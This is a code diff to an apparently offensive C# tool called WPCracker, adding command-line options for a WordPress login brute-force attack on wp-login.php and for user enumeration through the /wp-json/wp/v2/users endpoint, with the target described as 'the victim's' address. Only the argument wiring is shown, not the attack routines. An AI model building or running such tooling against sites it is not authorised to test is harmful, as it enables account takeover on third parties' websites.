@@ -3,8 +3,21 @@ using PowerArgs;
 
 namespace WPCracker
 {
+    [AllowUnexpectedArgs]
     public class MyArgs
     {
+        public class AttackArgs
+        {
+            [HelpHook, ArgShortcut("-?"), ArgDescription("Shows this help")]
+            public bool Help { get; set; }
+
+            [ArgShortcut("--brute"), ArgDescription("Select brute force attack")]
+            public bool BruteForce { get; set; }
+
+            [ArgShortcut("--enum"), ArgDescription("Select user enumeration")]
+            public bool UserEnumeration { get; set; }
+        }
+        
         public class BruteForce
         {
             [HelpHook, ArgShortcut("-?"), ArgDescription("Shows this help")]
@@ -27,7 +40,22 @@ namespace WPCracker
 
             public void Main()
             {
-                Attacks.BruteForceAttack(TargetUri, Username, WordlistPath, MaxThreads, BatchCount);
+                Attacks.BruteForceAttack(TargetUri + "/wp-login.php", Username, WordlistPath, MaxThreads, BatchCount);
+                Console.ReadLine();
+            }
+        }
+        
+        public class UserEnumeration
+        {
+            [HelpHook, ArgShortcut("-?"), ArgDescription("Shows this help")]
+            public bool Help { get; set; }
+
+            [ArgRequired(PromptIfMissing = true), ArgShortcut("u"), ArgDescription("The victim's HTTP web address")]
+            public string TargetUri { get; set; }
+
+            public void Main()
+            {
+                Attacks.UserEnum(TargetUri + "/wp-json/wp/v2/users");
                 Console.ReadLine();
             }
         }
